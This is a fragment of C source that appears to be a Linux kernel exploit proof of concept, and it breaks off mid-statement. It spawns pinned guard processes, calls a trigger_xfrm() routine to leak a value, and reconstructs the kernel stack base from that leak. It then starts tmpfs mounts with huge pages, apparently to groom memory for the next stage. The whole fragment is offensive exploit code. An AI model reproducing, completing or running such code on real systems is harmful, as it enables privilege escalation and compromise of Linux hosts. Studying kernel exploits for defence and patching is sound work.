  for (int i = 0; i < 4; i++) {
    guards[i] = fork();
    if (guards[i] < 0)
      die("guard fork");
    if (!guards[i]) {
      for (;;)
        pause();
    }
  }
  pid_t worker = fork();
  if (worker < 0)
    die("worker fork");
  if (worker > 0) {
    int st;
    waitpid(worker, &st, 0);
    for (int i = 0; i < 4; i++)
      kill(guards[i], SIGKILL);
    return WIFEXITED(st) ? WEXITSTATUS(st) : 128;
  }
  printf("[*] worker allocated after four pinned guard tasks, pid=%d\n",
         getpid());
  uint32_t leak = trigger_xfrm();
  uint64_t stack = 0xffffc90000000000ULL | (uint64_t)(leak & ~0x3fffU);
  printf("[+] reconstructed unique current stack base: %#lx\n", stack);
  mkdir("[REDACTED:source_path:000211]", 0700);
  mkdir("[REDACTED:source_path:000208]", 0700);
  if (mount("tmpfs", "[REDACTED:source_path:000211]", "tmpfs", 0, "size=128M,huge=always"))
